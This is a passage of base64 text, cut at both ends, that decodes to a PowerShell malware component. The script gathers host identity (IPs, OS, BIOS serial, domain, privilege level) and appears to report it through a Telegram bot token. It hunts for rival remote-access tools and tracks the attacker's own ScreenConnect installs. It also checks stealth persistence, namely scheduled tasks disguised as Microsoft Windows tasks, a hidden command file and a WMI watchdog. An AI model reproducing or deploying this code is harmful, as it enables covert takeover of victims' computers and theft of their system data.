ZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRs
eUNvbnRpbnVlJw0KdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90
b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9DQoNCmZ1
bmN0aW9uIEdldC1DZmcgew0KICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJw0KICAgICRjZmcgPSBAe30NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyBy
ZXR1cm4gJGNmZyB9DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFj
aC1PYmplY3Qgew0KICAgICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVphLXowLTlfXSspXHMq
PVxzKiguKilccyokJykgew0KICAgICAgICAgICAgJGNmZ1skbWF0Y2hlc1sxXV0gPSAkbWF0Y2hl
c1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGNmZw0KfQ0KDQpmdW5j
dGlvbiBFc2MoW3N0cmluZ10kcykgew0KICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcn
IH0NCiAgICByZXR1cm4gKCRzIC1yZXBsYWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcsICcm
bHQ7JyAtcmVwbGFjZSAnPicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0LVB1YmxpY0lwIHsN
CiAgICBmb3JlYWNoICgkdSBpbiBAKA0KICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9y
ZycsDQogICAgICAgICAgICAnaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcCcsDQogICAgICAgICAgICAn
aHR0cHM6Ly9pY2FuaGF6aXAuY29tJw0KICAgICAgICApKSB7DQogICAgICAgIHRyeSB7DQogICAg
ICAgICAgICAkciA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAt
VGltZW91dFNlYyA2DQogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcp
LlRyaW0oKQ0KICAgICAgICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15cZHsxLDN9KFwuXGR7MSwzfSl7
M30kJyAtb3IgJGlwIC1tYXRjaCAnOicpIHsgcmV0dXJuICRpcCB9DQogICAgICAgIH0gY2F0Y2gg
e30NCiAgICB9DQogICAgcmV0dXJuICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbElwcyB7
DQogICAgdHJ5IHsNCiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1p
bHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVy
ZS1PYmplY3QgeyAkXy5JUEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfLlByZWZpeE9y
aWdpbiAtbmUgJ1dlbGxLbm93bicgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1FeHBh
bmRQcm9wZXJ0eSBJUEFkZHJlc3MgLVVuaXF1ZQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4g
KCRpcHMgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAk
aXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAt
RmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAk
Xy5JUEFkZHJlc3MgfSB8IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgJF8gLW5vdGxpa2UgJzEyNy4q
JyAtYW5kICRfIC1ub3RsaWtlICcqOionIH0NCiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dXJuICgo
JGlwcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gg
e30NCiAgICByZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQogICAgJG8g
PSBbb3JkZXJlZF1Aew0KICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsg
QnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnDQogICAgICAgIERvbWFpbiA9ICduL2EnOyBJbnN0
YWxsRGF0ZSA9ICduL2EnOyBMYXN0Qm9vdCA9ICduL2EnDQogICAgICAgIENQVSA9ICduL2EnOyBN
YW51ZmFjdHVyZXIgPSAnbi9hJzsgTW9kZWwgPSAnbi9hJzsgU2VyaWFsID0gJ24vYScNCiAgICAg
ICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0Ig
PSAnbi9hJw0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2Ug
V2luMzJfT3BlcmF0aW5nU3lzdGVtDQogICAgICAgICRvLkNhcHRpb24gPSAkb3MuQ2FwdGlvbg0K
ICAgICAgICAkby5WZXJzaW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXINCiAgICAgICAgJG8uQXJjaCA9ICRvcy5PU0FyY2hpdGVjdHVyZQ0KICAgICAg
ICAkby5JbnN0YWxsRGF0ZSA9ICgkb3MuSW5zdGFsbERhdGUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5
eXl5LU1NLWRkJykNCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwg
R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpDQogICAgICAgICRvLlRvdGFsUkFN
X0dCID0gW21hdGhdOjpSb3VuZCgkb3MuVG90YWxWaXNpYmxlTWVtb3J5U2l6ZSAvIDFNQiwgMSkN
CiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJGNzID0gR2V0LUNpbUluc3RhbmNl
IFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgICAgICRvLkRvbWFpbiA9IGlmICgkY3MuUGFydE9m
RG9tYWluKSB7ICRjcy5Eb21haW4gfSBlbHNlIHsgJGNzLldvcmtncm91cCB9DQogICAgICAgICRv
Lk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFjdHVyZXINCiAgICAgICAgJG8uTW9kZWwgPSAkY3Mu
TW9kZWwNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJG8uQ1BVID0gKEdldC1D
aW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzb3IgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBh
bmRQcm9wZXJ0eSBOYW1lKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5T
ZXJpYWwgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX0JJT1MpLlNlcmlhbE51bWJlcg0KICAgIH0g
Y2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkZCA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9M
b2dpY2FsRGlzayAtRmlsdGVyICJEZXZpY2VJRD0nQzonIg0KICAgICAgICAkby5EaXNrRnJlZV9H
QiA9IFttYXRoXTo6Um91bmQoJGQuRnJlZVNwYWNlIC8gMUdCLCAxKQ0KICAgICAgICAkby5EaXNr
U2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwgMSkNCiAgICB9IGNhdGNoIHt9
DQogICAgcmV0dXJuICRvDQp9DQoNCmZ1bmN0aW9uIEdldC1TdmNMaW5lKFtzdHJpbmddJG5hbWUp
IHsNCiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlDQogICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICdOT1QgSU5TVEFMTEVEJyB9DQog
ICAgcmV0dXJuICgnezB9IChTdGFydD17MX0pJyAtZiAkcy5TdGF0dXMsICRzLlN0YXJ0VHlwZSkN
Cn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tIZWFsdGgoW3N0cmluZ10kdG4pIHsNCiAgICAkb3V0ID0g
JiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlm
ICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQpIHsNCiAgICAgICAgcmV0dXJuIEB7
IFByZXNlbnQgPSAkZmFsc2U7IFN0YXR1cyA9ICdNSVNTSU5HJzsgTmV4dCA9ICcnOyBMYXN0ID0g
Jyc7IFJlc3VsdCA9ICcnIH0NCiAgICB9DQogICAgJG1hcCA9IEB7fQ0KICAgIGZvcmVhY2ggKCRs
aW5lIGluICRvdXQpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpdKyk6XHMq
KC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkbWFwWyRtYXRjaGVzWzFdLlRyaW0oKV0gPSAkbWF0
Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc3RhdHVzID0gJG1hcFsnU3Rh
dHVzJ10NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1
cyddIH0NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAncHJlc2VudCcgfQ0KICAg
ICRuZXh0ID0gJG1hcFsnTmV4dCBSdW4gVGltZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsgJG5l
eHQgPSAnJyB9DQogICAgJGxhc3QgPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5v
dCAkbGFzdCkgeyAkbGFzdCA9ICcnIH0NCiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1bHQn
XQ0KICAgIGlmICgtbm90ICRyZXN1bHQpIHsgJHJlc3VsdCA9ICcnIH0NCiAgICAkaGVhbHRoeSA9
ICgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNl
bnQnKQ0KICAgIHJldHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgSGVh
bHRoeSA9IFtib29sXSRoZWFsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkc3RhdHVzDQogICAgICAg
IE5leHQgICAgPSAkbmV4dA0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0
ICA9ICRyZXN1bHQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAkdG9r
ZW5zID0gQCgNCiAgICAgICAgJ0FueURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAn
RFdBZ2VudCcsICdEV1NlcnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAg
ICdXaW5WTkMnLCAndm5jc2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obycsICdSdXN0
RGVzaycsICdSZW1vdGVQQycsICdEYW1lV2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0
ZXJhJywgJ05pbmphUk1NJywgJ05pbmphT25lJywgJ05pbmphJywgJ0thc2V5YScsICdQdWxzZXdh
eScsICdTeW5jcm8nLA0KICAgICAgICAnU3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1NvbGFy
V2luZHMnLCAnQ29ubmVjdFdpc2UnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0KICAgICAgICAn
QWN0aW9uMScsICdTaW1wbGVIZWxwJywgJ0JvbWdhcicsICdCZXlvbmRUcnVzdCcsICdNZXNoQWdl
bnQnLCAnTWVzaCBDZW50cmFsJywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywgJ3RhY3RpY2Fscm1t
JywgICAgICAgICAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19o
b3N0JywNCiAgICAgICAgJ0Nocm9tZSBSZW1vdGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0U3Vw
cG9ydCcsICdMZXZlbC5pbycsICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdEYXR0byBSTU0nLCAn
Q29udGludXVtJw0KICAgICkNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAgIGZ1bmN0aW9u
IEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkgew0KICAgICAgICAka2V5ID0g
IiRraW5kfCRuYW1lIi5Ub0xvd2VySW52YXJpYW50KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRh
aW5zS2V5KCRrZXkpKSB7IHJldHVybiB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAg
ICAgICAgW3ZvaWRdJGhpdHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2lu
ZCwgKEVzYyAkbmFtZSkpKQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkbiA9ICRfLk5hbWUN
CiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICBpZiAoJG4gLWxpa2UgJ1NjcmVl
bkNvbm5lY3QgQ2xpZW50KicpIHsgcmV0dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRv
a2Vucykgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQgLWxpa2UgIiok
dCoiKSB7DQogICAgICAgICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykp
IikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAg
fQ0KDQogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7DQogICAgICAgICRuID0gJF8uUHJvY2Vzc05hbWUNCiAgICAgICAgaWYgKCRu
IC1saWtlICcqU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0
IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAg
ICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5pbnN0ID0gQCgNCiAgICAgICAg
J0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFs
bFwqJywNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5k
b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0
aCBpbiAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4g
PSBbc3RyaW5nXSRfLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0NCiAgICAgICAgICAgIGlmICgkZG4gLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
dXJuIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAg
ICAgICBpZiAoJGRuIC1saWtlICIqJHQqIikgew0KICAgICAgICAgICAgICAgICAgICBBZGQtSGl0
ICdtc2knICRkbg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIH0N
CiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkaGl0cw0KfQ0K
DQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAgJGxpc3QgPSBOZXctT2JqZWN0IFN5c3Rl
bS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgIEdldC1TZXJ2aWNlIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkZnAg
PSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0g
fSBlbHNlIHsgJz8nIH0NCiAgICAgICAgJHRhZyA9IGlmICgkZnAgLWVxICc1ZjYwMTA1Nzk4NTJl
NTA3JykgeyAnS0VFUC1QUklNQVJZJyB9DQogICAgICAgIGVsc2VpZiAoJGZwIC1lcSAnZjg2MWM4
MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAgIGVsc2UgeyAnRk9SRUlHTicgfQ0K
ICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4g
W3syfV0nIC1mIChFc2MgJF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcp
KQ0KICAgIH0NCg0KICAgICRyb290cyA9IEAoDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXN9
XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIg0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRy
b290cykgew0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQgLURpcmVjdG9yeSAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAg
IFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5G
dWxsTmFtZSkpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAg
ICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3Rh
bGxcKicsDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2lu
ZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBh
dGggaW4gJHVuaW5zdCkgew0KICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRp
c3BsYXlOYW1lIC1saWtlICcqU2NyZWVuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9i
amVjdCB7DQogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRp
c3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQo
KCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwg
KEVzYyAkdmVyKSkpDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3QuQ291bnQgLWVx
IDApIHsgW3ZvaWRdJGxpc3QuQWRkKCctIChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0N
Cg0KJGNmZyA9IEdldC1DZmcNCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcu
Q0hBVF9JRCkgew0KICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3Jr
RGlyICdib290LmVycicpIC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlDQogICAgZXhpdCAyDQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5lY3QgQ2xp
ZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4
NjFjODE0MGQ0NTM0MjcpJw0KJG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1
cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
d3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlByaW5j
aXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0K
JG1zaUNhY2hlID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAo
VGVzdC1QYXRoICRtc2lDYWNoZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1z
aUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8gMUtCKQ0KfSBlbHNlIHsgJ25vbmUnIH0NCg0KJG1vblBh
dGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJw0KJGV0bE1vbiA9ICIkZW52OlBy
b2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlXGV0bF9tb24uY21k
Ig0KJGhhc01vbiA9IFRlc3QtUGF0aCAkbW9uUGF0aA0KJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRs
TW9uDQoNCiMgcGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9t
IGlkZW50aXR5LmNmZyB3aGVuIHByZXNlbnQNCiRpZENmZyA9IEpvaW4tUGF0aCAkV29ya0RpciAn
aWRlbnRpdHkuY2ZnJw0KJGlkTWFwID0gQHt9DQppZiAoVGVzdC1QYXRoICRpZENmZykgew0KICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkaWRDZmcgfCBGb3JFYWNoLU9iamVjdCB7DQogICAg
ICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRN
YXBbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgIH0NCn0NCiRleHBlY3RlZFRhc2tz
ID0gQCgNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19B
IH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcgfSk7IFJv
bGUgPSAidGljayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnXE1pY3Jvc29mdFxX
aW5kb3dzXFBMQVxTZXJ2ZXInIH0pOyBSb2xlID0gImJhY2t1cCAkKCRpZE1hcC5NT19CKW0gKGNo
YWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRB
U0tfQyB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcgfSk7
IFJvbGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFw
LlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcVGNw
aXBcSXBBZGRyZXNzQ29uZmxpY3QxJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQop
DQojIGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0LVdtaU9i
amVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50
Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nQyciIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlDQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNo
ZVdhdGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5l
ICR3bWlDKSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0gMA0KZm9yZWFjaCAo
JHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7
DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRhc2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsg
JHRhc2tCYWQrKzsgJG1hcmsgPSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVz
LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0NCiAgICAkaCA9
IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0
aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAgICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxz
ZWlmICgkaC5QcmVzZW50KSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAn
V0VBSycNCiAgICB9IGVsc2Ugew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0g
J01JU1NJTkcnDQogICAgfQ0KICAgICRleHRyYSA9ICcnDQogICAgaWYgKCRoLlByZXNlbnQpIHsN
CiAgICAgICAgJGJpdHMgPSBAKCkNCiAgICAgICAgaWYgKCRoLlN0YXR1cykgeyAkYml0cyArPSAk
aC5TdGF0dXMgfQ0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJlc3VsdCAt
bmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9DQogICAgICAg
IGlmICgkYml0cy5Db3VudCkgeyAkZXh0cmEgPSAnICgnICsgKCRiaXRzIC1qb2luICcsICcpICsg
JyknIH0NCiAgICB9DQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2RlPnsx
fTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJvbGUp
LCAoRXNjICRleHRyYSkpKQ0KfQ0KDQokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQ0KJGFs
